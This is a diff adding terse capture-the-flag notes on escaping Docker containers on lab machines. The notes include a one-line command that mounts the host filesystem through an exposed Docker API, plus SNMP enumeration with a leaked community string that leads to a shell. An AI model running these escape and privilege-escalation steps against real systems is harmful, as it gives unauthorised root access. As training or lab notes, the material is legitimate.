@@ -1,0 +1,47 @@
+docker
+
+```
+docker -H escape.thm:2375 run -v /:/mnt --rm -it nginx chroot /mnt sh
+```
+
+docker addr:port image ls
+
+snmp docker escape   # PG_ESCAPE
+
+```
+#type mount
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
+...
+/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro,data=ordered)
+
+so we check tmp
+
+$ df -T /tmp
+Filesystem     Type 1K-blocks    Used Available Use% Mounted on
+/dev/sda1      ext4  16446332 4761392  10829800  31% /tmp
+```
+
+```
+$ cd /var/backups && ls -la
+total 20
+drwxr-xr-x 1 root root 4096 Nov  5 13:41 .
+drwxr-xr-x 1 root root 4096 Oct 13 09:15 ..
+-rwxrw-rw- 1 root root 7340 Sep 18 17:11 .snmpd.conf
+
+it had all thing to do snmpwalk
+
+kali@kali:~$ sudo apt-get install snmp -y
+kali@kali:~$ sudo apt-get install snmp-mibs-downloader -y
+kali@kali:~$ sudo download-mibs
+kali@kali:~$ cat /etc/snmp/snmp.conf
+# As the snmp packages come without MIB files due to license reasons, loading
+# of MIBs is disabled by default. If you added the MIBs you can reenable
+# loading them by commenting out the following line.
+mibs +ALL
+
+now we all set
+
+# snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.120.138 nsExtendOutput1
+
+make a paylaod in tmp file as said and got shell
+```
